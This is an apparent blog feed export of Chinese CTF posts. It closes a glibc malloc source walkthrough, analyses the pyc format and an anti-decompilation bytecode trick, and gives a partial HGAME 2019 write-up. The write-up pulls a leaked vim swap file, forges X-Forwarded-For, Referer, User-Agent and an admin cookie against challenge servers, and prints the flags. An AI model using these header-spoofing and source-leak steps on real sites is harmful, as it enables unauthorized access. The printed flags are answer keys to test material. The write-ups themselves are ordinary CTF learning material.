<p>补： binmap 的大致原理。binmap 一共 128 bit，16 个字节，分成 4 个 int 变量，每一个 int 变量称为一个 block，每个 block 有 32 个 bit，最多可以表示 32 个 bin 的状态，使用宏 idx2block 可以计算出一个 index(bin) 在 binmap 中属于哪个 block。 idx2bit 宏取第 i 位为1，剩下的置 0，例如 idx2bit(2) 会生成 “00000000000000000000000000000100”</p>
</blockquote>
<p>其实利用 binmap 来遍历 largebin 和正常遍历效果是一样的，但是利用 binmap 可以很大的提升效率。</p>
<p>当这一步操作也不能满足 nb 时，就需要动用 top chunk 了。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">    size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE)) &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset(victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head(victim, nb | PREV_INUSE |</span><br><span class="line">	       (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      check_malloced_chunk(av, victim, nb);</span><br><span class="line">      <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>流程还是一样的，如果 top chunk size 大于 nb，就从 top chunk 中切割下来 chunk 返回给用户。如果 top chunk 大小也不够了，会先执下面的代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks(av)) &#123;</span><br><span class="line">      assert(in_smallbin_range(nb));</span><br><span class="line">      malloc_consolidate(av);</span><br><span class="line">      idx = smallbin_index(nb); <span class="comment">/* restore original bin index */</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>引用 malloc.c 注释如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">If there is space available in fastbins, consolidate and retry,</span><br><span class="line">      to possibly avoid expanding memory. This can occur only if nb is</span><br><span class="line">      in smallbin range so we didn&#x27;t consolidate upon entry.</span><br></pre></td></tr></table></figure></div>

<p>如果存在 fastbin chunk，就执行 malloc_consolidate 合并 fastbin chunk，然后再尝试</p>
<blockquote>
<p>为什么还要检查 fastbin？ 两个原因，一是如果开启了 ATOMIC_FASTBINS ，由于 free fastbin chunk 的时候不需要加锁，所以 malloc 走到这一步的时候可能已经有其他线程向 fastbin 中注入了新的 chunk，另外一个原因是如果 nb 是一个 smallbin chunk，走到这一步说明之前所有的分配操作都失败了，但是在分配 smallbin chunk 的时候始终都没有调用过 malloc_consolidate，所以在 malloc 尾声的时候可以尝试合并 fastbin chunk 构造出符合要求的 chunk。</p>
</blockquote>
<p>如果 fastbin 链表是空的，那么无论那一个缓冲区都无法提供合适的堆块了(甚至 top chunk 的空间也不够)，这时就需要映射另一片内存(也就是所谓的 mmap)。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="type">void</span> *p = sYSMALLOc(nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure></div>

<p>注意调用的依旧是一个外壳函数，叫做 sYSMALLOc。</p>
<p>large bin 的分配逻辑应该是 malloc 中最为复杂的，可以参考下面这张图片</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_7.png"
                      alt="malloc_free_7.png"
                ></p>
<p>复杂的主要原因是前面尝试通过 fastbin、smallbin、unsortedbin 分配堆块都失败了，但是经过各种切割合并 chunk 的操作之后这些缓冲区中又很有可能出现合适的 chunk ，为了尽量减少向操作系统申请内存的次数，就要极大限度的利用好缓冲区的 chunk。</p>
<h2 id="malloc-的流程总结"><a href="#malloc-的流程总结" class="headerlink" title="malloc 的流程总结"></a>malloc 的流程总结</h2><ol>
<li>获取分配区的锁。</li>
<li>将用户的请求大小转换为实际需要分配的 chunk 空间大小。</li>
<li>判断所需分配 chunk 是否在 fastbin 区域，如果是的话， 则转下一步，否则跳到第 5 步。</li>
<li>首先尝试在 fastbins 中取一个所需大小的 chunk 分配给用户。 如果可以找到， 则分配结束。 否则转到下一步。</li>
<li>判断所需大小是否处在 small bins 中，如果 chunk 大小处在 smallbins 中，则转下一步，否则转到第 7 步。</li>
<li>根据所需分配的 chunk 的大小， 找到具体所在的某个 smallbin，从该 bin 的尾部摘取一个恰好满足大小的 chunk。 若成功，则分配结束，否则转到下一步。</li>
<li>到了这一步， 说明需要分配的是一块大的内存，或者 small bins 中找不到合适的chunk。于是，ptmalloc 首先会遍历 fastbins 中的 chunk，将相邻的 chunk 进行合并，并链接到 unsorted bin 中， 然后遍历 unsorted bin 中的 chunk，如果 unsorted bin 只有一个 chunk，并且这个 chunk 在上次分配时被使用过，并且所需分配的 chunk 大小属于 small bins，并且 chunk 的大小大于等于需要分配的大小，这种情况下就直接将该 chunk 进行切割，分配结束，否则将根据 chunk 的空间大小将其放入 smallbins 或是 large bins 中，遍历完成后，转入下一步。</li>
<li>到了这一步，说明需要分配的是一块大的内存，或者 small bins 和 unsorted bin 中都找不到合适的 chunk，并且 fast bins 和 unsorted bin 中所有的 chunk 都清除干净了。 从 large bins 中按照“smallest-first， best-fit”原则， 找一个合适的 chunk， 从中划分一块所需大小的 chunk， 并将剩下的部分链接回到 bins 中。 若操作成功， 则分配结束， 否则转到下一步。</li>
<li>如果搜索 fast bins 和 bins 都没有找到合适的 chunk， 那么就需要操作 top chunk 来进行分配了。 判断 top chunk 大小是否满足所需 chunk 的大小， 如果是， 则从 topchunk 中分出一块来。 否则转到下一步。</li>
<li>到了这一步， 说明 top chunk 也不能满足分配要求， 所以， 于是就有了两个选择: 如果是主分配区， 调用 sbrk()， 增加 top chunk 大小； 如果是非主分配区，调用 mmap来分配一个新的 sub-heap，增加 top chunk 大小； 或者使用 mmap()来直接分配。 在这里， 需要依靠 chunk 的大小来决定到底使用哪种方法。 判断所需分配的 chunk大小是否大于等于 mmap 分配阈值， 如果是的话， 则转下一步， 调用 mmap 分配，否则跳到第 12 步， 增加 top chunk 的大小。</li>
<li>使用 mmap 系统调用为程序的内存空间映射一块 chunk_size align 4kB 大小的空间。然后将内存指针返回给用户。</li>
<li>判断是否为第一次调用 malloc， 若是主分配区， 则需要进行一次初始化工作， 分配一块(chunk_size + 128KB) align 4KB 大小的空间作为初始的 heap。 若已经初始化过了， 主分配区则调用 sbrk()增加 heap 空间， 分主分配区则在 top chunk 中切割出一个 chunk， 使之满足分配需求， 并将内存指针返回给用户。</li>
</ol>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a class="link"   href="https://bbs.pediy.com/thread-223283.htm" >https://bbs.pediy.com/thread-223283.htm<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_29343201/article/details/59614863" >https://blog.csdn.net/qq_29343201&#x2F;article&#x2F;details&#x2F;59614863<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="http://www.cnblogs.com/Mainz/p/3546347.html" >http://www.cnblogs.com/Mainz/p/3546347.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/sinat_19596835/article/details/81665095" >https://blog.csdn.net/sinat_19596835&#x2F;article&#x2F;details&#x2F;81665095<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://mqzhuang.iteye.com/blog/1064803" >https://mqzhuang.iteye.com/blog/1064803<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>华庭 《Glibc 内存管理 Ptmalloc2 源代码分析》<br>cloudburst ptmalloc flow chart</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>PYC 文件的简单分析</title>
    <url>/2019/02/13/pyc-simple/</url>
    <content><![CDATA[<p>最近做 CTF 碰到了有关 pyc 的题目，通常来说这种题目都是用 uncompyle6 直接搞出源代码然后审计，但是某些情况下，反编译 pyc 可能会失败，造成失败的原因有很多，最常见的就是作者将 pyc 中的结构、byte-code或者一些逻辑进行修改和混淆，甚至会修改 python 的源代码来自定义 opcode。今天我们就来简单分析一下 pyc。</p>
<span id="more"></span>

<h2 id="PYC-简介"><a href="#PYC-简介" class="headerlink" title="PYC 简介"></a>PYC 简介</h2><p>python 语言上手容易，使用简单，并且拥有数量庞大的第三方模块支持，说它目前是最受欢迎的语言之一并不为过，不过任何事物都有两面性，python 也有致命的缺点–运行速度慢。<br>同时接触过 python 和 C 语言的同学可能很清楚这一点，使用 python 和 C 语言编写两个功能相同的程序，python 程序得出结果可能要花费 2 倍于(甚至更多) C 程序的时间，原因就在于 python 是一种抽象程度更高的语言，并且它使用 python 虚拟机执行代码，而 C 语言更加贴近底层，甚至可以直接和硬件进行交互，谁快谁慢就一目了然了。<br>python 虚拟机大家可能没有什么概念，但是提到 python byte-code 或者 pyc 文件就不一样了，在开发一个 python 程序的时候，我们经常会看到文件夹下不时出现 *.pyc 这样的文件，将它们全部删除也不会对项目产生什么影响，不过每次运行项目，它们都会重新出现。<br>实际上， pyc 文件所存储的主体就是 python byte-code 另外还有一些必要的结构。为什么会存在 pyc 文件呢？这就回到了之前的问题上，即 python 运行速度慢，由于计算机无法理解高级语言，我们写的代码必须先被编译成计算机能识别的机器码才能被执行，python 也是一样，不过开发者在机器底层和源代码之间加了一层虚拟机，将许多底层硬件细节进行了封装和屏蔽，使得程序员可以专注于自己的代码逻辑上面，这样也造成了一些弊端，python 程序通常以 .py 为后缀名，其内容就是开发者所编写的源代码，所以，每次运行程序的时候，都需要先编译再执行，当项目代码成千上万行时，如果每次运行都需要编译，那么效率可想而知。  </p>
<p>为了解决这个问题。python 的开发者提出了一个很好的解决方案，将一个 python 程序会使用到的模块先编译成 pyc 文件，之后再调用的时候，即可省去编译的时间，提高程序效率。这里的 pyc 文件实际上就是 python 模块的预编译文件。</p>
<h2 id="PYC-格式解析"><a href="#PYC-格式解析" class="headerlink" title="PYC 格式解析"></a>PYC 格式解析</h2><p>由于 python 程序的执行依赖于 python 虚拟机，自然有自定义的一套操作码，这些操作码就称为 python 字节码(byte-code)。<br>pyc 文件中大部分都是字节码，剩下的包括文件头、程序资源、变量符号等等，我们一点一点来看。<br>首先要生成一个 pyc 文件，例如下面一段很简单的 python 代码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># test1.py</span><br><span class="line">def a():</span><br><span class="line">    return 1</span><br><span class="line"></span><br><span class="line">def b():</span><br><span class="line">    return 2</span><br><span class="line"></span><br><span class="line">x = a()</span><br><span class="line">y = b()</span><br><span class="line">print(x + y)</span><br></pre></td></tr></table></figure></div>
<p>要想得到 pyc 文件，我们只需要新建另一个文件，然后 import 即可，例如(注意两个文件需要在同一个文件夹下面)</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import test1</span><br></pre></td></tr></table></figure></div>
<p>如果不出意外的话，现在文件夹下就会出现一个 test1.pyc 文件。<br>另外，也可以直接使用 python 命令行的命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m test1.py</span><br></pre></td></tr></table></figure></div>
<p>来生成 pyc 文件。</p>
<p>我们可以使用 hexdump(linux 下)来检查这个文件，不过更加明智的方法是利用 010 editor 的模板。  <br>使用 010 editor 打开 pyc 文件，会自动提示是否加载 pyc 模板(如果没有，可以手动在上面的工具栏中运行模板)，选择加载，通常你会发现下面的通知栏报出一个错误，大概的意思是没法儿确定 python 版本，这是由于 010 editor 自带的 pyc 模板编写时间比较早，没有兼容后续的 python 版本，我们选择编辑模板，将下面这段代码替换到相应的位置上去。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum &lt;uint16&gt; MagicValue &#123;</span><br><span class="line">    PY_24a0 = 62041,</span><br><span class="line">    PY_24a3 = 62051,</span><br><span class="line">    PY_24b1 = 62061,</span><br><span class="line">    PY_25a0_1 = 62071,</span><br><span class="line">    PY_25a0_2 = 62081,</span><br><span class="line">    PY_25a0_3 = 62091,</span><br><span class="line">    PY_25a0_4 = 62092,</span><br><span class="line">    PY_25b3_1 = 62101,</span><br><span class="line">    PY_25b3_2 = 62111,</span><br><span class="line">    PY_25c1 = 62121,</span><br><span class="line">    PY_25c2 = 62131,</span><br><span class="line">    PY_26a0 = 62151,</span><br><span class="line">    PY_26a1 = 62161,</span><br><span class="line">    PY_27a0_1 = 62171,</span><br><span class="line">    PY_27a0_2 = 62181,</span><br><span class="line">    PY_27a0_a = 62211,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>这样，模板就能正常工作了，我们从模板解析的结果来简单分析一下 pyc 文件结构。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pyc-1.png"
                      alt="image"
                ></p>
<p>首先点开 struct file，第一项就是 struct Magic magic，这就是所谓的魔数，很多文件都有自己的魔数，例如 java 的魔数 cafebabe 就非常经典。不过 pyc 文件的魔数并没有那么炫酷，它由 4 个字节组成，前两个字节是可变的，它和编译 python 文件的 python 版本有关，接下来两个字节是固定的 0D0A，转换成 ASC 码就是 \r\n，所以如果一个 pyc 文件被以文本形式打开复制到另一个文件中，新文件一般是不会正常工作的，这也是 pyc 的一种简单保护手段。<br>接下来是 char mtime，它也占据 4 个字节，这个字段表示该 pyc 文件的编译日期，用 unix 时间戳来表示，由于字节的小端序，要反过来看，例如我这里的文件时间戳是 E9FA5C5C，那么转换成真正的时间就是 2019-02-08 11:43:37<br>然后就是 pyc 文件的主体部分了，010 解析为 struct r_object data，打开之后里面有很多内容，首先是 enum ObjType type(TYPE_CODE)，占 1 个字节，用它来表示一个 PyCodeObject 开始了。</p>
<h2 id="PyCodeObject"><a href="#PyCodeObject" class="headerlink" title="PyCodeObject"></a>PyCodeObject</h2><p>PyCodeObject 是 pyc 文件的主要组成部分，如果想要了解它的具体生成方法和定义，请阅读 python 源代码中的 Include&#x2F;code.h 和 Python&#x2F;marshal.c</p>
<p>一个 PyCodeObject 包含许多小的组成成部分，这些小部分称为 PyObject。<br>根据 010 模板解析结果，PyObject 第一个字节指明了接下来的内容是什么类型，例如 0x63 就表示后面跟着的是 byte-code，或者 0x28 就表示后面跟着的是常量列表等等，这里有一份定义类型の源代码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//Python/marshal.c:22</span><br><span class="line">#define TYPE_NULL               &#x27;0&#x27;</span><br><span class="line">#define TYPE_NONE               &#x27;N&#x27;</span><br><span class="line">#define TYPE_FALSE              &#x27;F&#x27;</span><br><span class="line">#define TYPE_TRUE               &#x27;T&#x27;</span><br><span class="line">#define TYPE_STOPITER           &#x27;S&#x27;</span><br><span class="line">#define TYPE_ELLIPSIS           &#x27;.&#x27;</span><br><span class="line">#define TYPE_INT                &#x27;i&#x27;</span><br><span class="line">#define TYPE_INT64              &#x27;I&#x27;</span><br><span class="line">#define TYPE_FLOAT              &#x27;f&#x27;</span><br><span class="line">#define TYPE_BINARY_FLOAT       &#x27;g&#x27;</span><br><span class="line">#define TYPE_COMPLEX            &#x27;x&#x27;</span><br><span class="line">#define TYPE_BINARY_COMPLEX     &#x27;y&#x27;</span><br><span class="line">#define TYPE_LONG               &#x27;l&#x27;</span><br><span class="line">#define TYPE_STRING             &#x27;s&#x27;</span><br><span class="line">#define TYPE_INTERNED           &#x27;t&#x27;</span><br><span class="line">#define TYPE_STRINGREF          &#x27;R&#x27;</span><br><span class="line">#define TYPE_TUPLE              &#x27;(&#x27;</span><br><span class="line">#define TYPE_LIST               &#x27;[&#x27;</span><br><span class="line">#define TYPE_DICT               &#x27;&#123;&#x27;</span><br><span class="line">#define TYPE_CODE               &#x27;c&#x27;</span><br><span class="line">#define TYPE_UNICODE            &#x27;u&#x27;</span><br><span class="line">#define TYPE_UNKNOWN            &#x27;?&#x27;</span><br><span class="line">#define TYPE_SET                &#x27;&lt;&#x27;</span><br><span class="line">#define TYPE_FROZENSET          &#x27;&gt;&#x27;</span><br></pre></td></tr></table></figure></div>
<p>PyCodeObject 的第一个部分肯定是 TYPE_CODE，表示字节码区块，这也是重点的关注部分，除了 TYPE_CODE，下面的字段如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">argcount  参数个数</span><br><span class="line">nlocals   局部变量个数</span><br><span class="line">stacksize 栈空间大小</span><br><span class="line">flags     N/A</span><br><span class="line">TYPE_STRING 表示字节码开始</span><br><span class="line">r_long n  字节码的数量</span><br><span class="line">struct Instruction inst[] 字节码序列</span><br></pre></td></tr></table></figure></div>
<p>我们主要关注字节码，字节码类似于机器码，可以通过一定的手段将它们转换成类似于汇编语言的可读代码，这里我们需要用到 python 自带的模块 dis。<br>编写下面的脚本</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import dis</span><br><span class="line"></span><br><span class="line">pyc = read(&quot;test1.pyc&quot;, &quot;rb&quot;)</span><br><span class="line">pyc.read(30)</span><br><span class="line">target = pyc.read(0x31)</span><br><span class="line">dis.dis(target)</span><br></pre></td></tr></table></figure></div>
<p>就可以得到下面的代码<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pyc-2.png"
                      alt="image"
                ></p>
<p>从左到右分为四列，第一列代表字节偏移量，第二列是指令操作码的含义，第三列是操作数，第四列是操作数的说明。<br>简单分就能得出代码逻辑</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 0 LOAD_CONST          0 (0)    # 读取常量列表中的 0 号常量</span><br><span class="line"> 3 MAKE_FUNCTION       0      # 制作一个函数</span><br><span class="line"> 6 STORE_NAME          0 (0)  # 函数命名为字符串列表中的 0 号</span><br><span class="line"> 9 LOAD_CONST          1 (1)</span><br><span class="line">12 MAKE_FUNCTION       0</span><br><span class="line">15 STORE_NAME          1 (1)</span><br><span class="line">18 LOAD_NAME           0 (0)  # 取出函数 1</span><br><span class="line">21 CALL_FUNCTION       0     # 调用</span><br><span class="line">24 STORE_NAME          2 (2) # 存储返回值</span><br><span class="line">27 LOAD_NAME           1 (1) </span><br><span class="line">30 CALL_FUNCTION       0</span><br><span class="line">33 STORE_NAME          3 (3)</span><br><span class="line">36 LOAD_NAME           2 (2)   # 取出两个返回值</span><br><span class="line">39 LOAD_NAME           3 (3)</span><br><span class="line">42 BINARY_ADD                 # 相加</span><br><span class="line">43 PRINT_ITEM                 # 打印结果</span><br><span class="line">44 PRINT_NEWLINE</span><br><span class="line">45 LOAD_CONST          2 (2)</span><br><span class="line">48 RETURN_VALUE</span><br></pre></td></tr></table></figure></div>
<p>这就是简单的字节码分析，要注意我们的程序不包含复杂的代码，如果一个大型程序被编译成了 pyc 文件，就难以分析了。 </p>
<p>TYPE_CODE 之后就是其他的 PyObject，例如本例中剩余的有</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">consts 常量列表</span><br><span class="line">names  字符串列表</span><br><span class="line">varnames 局部变量名列表</span><br><span class="line">freevars 自由变量名列表</span><br><span class="line">cellvars 单元变量名列表</span><br><span class="line">filename 文件名</span><br><span class="line">name     N/A</span><br></pre></td></tr></table></figure></div>
<p>这些部分的结构大同小异，就不一一分析了。  </p>
<p>这里有一份 PyCodeObject 的具体定义，感兴趣的同学可以仔细看看。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//Include/code.h</span><br><span class="line">typedef struct &#123;</span><br><span class="line">    PyObject_HEAD</span><br><span class="line">    int co_argcount;        /* #arguments, except *args */</span><br><span class="line">    int co_nlocals;     /* #local variables */</span><br><span class="line">    int co_stacksize;       /* #entries needed for evaluation stack */</span><br><span class="line">    int co_flags;       /* CO_..., see below */</span><br><span class="line">    PyObject *co_code;      /* instruction opcodes */</span><br><span class="line">    PyObject *co_consts;    /* list (constants used) */</span><br><span class="line">    PyObject *co_names;     /* list of strings (names used) */</span><br><span class="line">    PyObject *co_varnames;  /* tuple of strings (local variable names) */</span><br><span class="line">    PyObject *co_freevars;  /* tuple of strings (free variable names) */</span><br><span class="line">    PyObject *co_cellvars;      /* tuple of strings (cell variable names) */</span><br><span class="line">    /* The rest doesn&#x27;t count for hash/cmp */</span><br><span class="line">    PyObject *co_filename;  /* string (where it was loaded from) */</span><br><span class="line">    PyObject *co_name;      /* string (name, for reference) */</span><br><span class="line">    int co_firstlineno;     /* first source line number */</span><br><span class="line">    PyObject *co_lnotab;    /* string (encoding addr&lt;-&gt;lineno mapping) See</span><br><span class="line">                   Objects/lnotab_notes.txt for details. */</span><br><span class="line">    void *co_zombieframe;     /* for optimization only (see frameobject.c) */</span><br><span class="line">    PyObject *co_weakreflist;   /* to support weakrefs to code objects */</span><br><span class="line">&#125; PyCodeObject;</span><br></pre></td></tr></table></figure></div>

<p>下面要提一下 PyCodeObject 的细节，如果你动手操作可能会发现，一个 pyc 文件里面包含很多的 PyCodeObject，实际上，一个 PyCodeObject 的定义范围是有限的，例如一个函数就定义在一个 PyCodeObject 里面，一个类、闭包等等都分别定义在不同的  PyCodeObject 里。<br>这张图片可以帮助理解<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pyc-3.png"
                      alt="image"
                ></p>
<h2 id="PYC-字节码处理"><a href="#PYC-字节码处理" class="headerlink" title="PYC 字节码处理"></a>PYC 字节码处理</h2><p>保护 python 程序难度很高，因为 python 程序的载体 .py 就是源代码文件，虽然有 pyc 这种不能直接看懂的文件，但是由于 uncompyle6 这样的神器存在，解析它也不在话下，目前保护 python 程序的思路一般是对变量名进行混淆，或者操作 pyc 文件混淆字节码，显然后者的效果要更好一些。<br>python 也好 C 语言也罢，万变不离其宗，python 的字节码处理其实和混淆一个 exe 程序类似，简单的包括跳转混淆、控制流混淆，复杂一些的可能涉及 byte-code 加密等等。<br>我们拿出最简单的一种方法分析，通过强制跳转干扰反编译器的工作。<br>首先要了解一些字节码的知识，可以用下面的代码获取你当前版本的 python 字节码表</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import opcode  </span><br><span class="line">for op in range(len(opcode.opname)):  </span><br><span class="line">  print(&#x27;0x%.2X(%.3d): %s&#x27; % (op, op, opcode.opname[op]))  </span><br></pre></td></tr></table></figure></div>
<p>在 pyc 文件中，字节码的格式一般是 opcode + 操作数，如果想要利用强制跳转实现字节码混淆的话，首先要找到强制跳转的字节码，我的机器上这条指令字节码是 0x71，我们会尝试构造这种结构<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pyc-4.png"
                      alt="image"
                ></p>
<p>uncompyle 的工作原理和一般的反编译器类似，它会尽力去匹配每一条指令，尝试将所有指令都覆盖到，但是在解析上面的代码时，碰到 load 不存在的常量时就会出错，无法继续反编译。<br>按照思路将 pyc 修改：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pyc-5.png"
                      alt="image"
                ><br>(0x37 是修改的字节，剩下的是添加的字节)修改之后的文件还是能正常运行，使用 python test1.pyc 即可运行。</p>
<p>然后丢到 linux 尝试 uncompyle6 反编译<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pyc-6.png"
                      alt="image"
                ><br>提示元组越界，这就是反编译到 649000 这句代码时尝试访问非法内存导致的！<br>类似的操作手法还有很多，具体思路可以参考如何混淆一个 exe 程序。  </p>
<p><strong>破釜沉舟</strong>： 一个思路是把 python 源代码取下来，将内部的 opcode 部分进行重新排序再编译回 python 解释器，用这种解释器编译的 pyc 代码用一般手段是不能反编译的，这就是 byte-code 加密，案例可以参考<a class="link"   href="https://juejin.im/entry/58bacfec1b69e6006b1a9c65" >《阴阳师：一个非酋的逆向旅程》<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>pyc 文件格式相较于 pe、elf 等老油条来说还是相当友好的，这得益于 Python的设计哲学 – python之禅</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">优美胜于丑陋</span><br><span class="line">明了胜于晦涩</span><br></pre></td></tr></table></figure></div>
<p>当然，这种简洁至上的设计思想也决定了 python 不能以效率致胜，不过这也无法阻挡程序员对它的热爱。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a class="link"   href="https://rednaxelafx.iteye.com/blog/382412" >python 字节码一览<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   href="https://kdr2.com/tech/python/pyc-format.html" >PYC文件格式分析<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   href="http://python.jobbole.com/84599/" >Python程序的执行原理<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   href="https://www.cnblogs.com/xuchunlin/p/6986247.html" >python 之禅<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>HGAME 2019 week1</title>
    <url>/2019/02/02/hgame-2019/</url>
    <content><![CDATA[<p>感谢杭电的师傅们举办的精彩比赛！</p>
<span id="more"></span>

<h2 id="谁吃了我的-flag"><a href="#谁吃了我的-flag" class="headerlink" title="谁吃了我的 flag"></a>谁吃了我的 flag</h2><p>根据题目提示想到应该是 vim 代码泄露，直接访问</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://118.25.111.31:10086/.index.html.swp</span><br></pre></td></tr></table></figure></div>
<p>下载到题目的源代码，在 linux 下使用命令 vim -r index.html.swp 即可还原出 flag。</p>
<p>flag: hgame{3eek_diScl0Sure_fRom+wEbsit@}</p>
<h2 id="换头大作战"><a href="#换头大作战" class="headerlink" title="换头大作战"></a>换头大作战</h2><p>考察了 header 的一些知识点，打开网页在输入框中随便写一点东西然后点击提交<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/hgame2019-1.png"
                      alt="image"
                ><br>提示需要使用 post 方式提交，使用 hackbar 提交，之后又会提示需要添加 XFF 头，构造下面的请求包：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /week1/how/index.php?want=yes HTTP/1.1</span><br><span class="line">Host: 120.78.184.111:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://120.78.184.111:8080/week1/how/index.php?want=yes</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Content-Length: 8</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: admin=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">want=yes</span><br></pre></td></tr></table></figure></div>

<p>接着又提示要使用 waterfox 浏览器访问，将 User-Agent 最后的 Firefox&#x2F;64.0 改成 Waterfox&#x2F;50.0 即可<br>接着要求从 哔哩哔哩来到这个网站，修改 Referer 为 <a class="link"   href="http://www.bilibili.com/" >www.bilibili.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 即可。<br>最后一步要求我们是 admin，将cookie 改成 admin&#x3D;1。</p>
<p>flag: hgame{hTTp_HeaDeR_iS_Ez}</p>
<h2 id="very-easy-web"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</h2><p>题目给出如下代码</p>
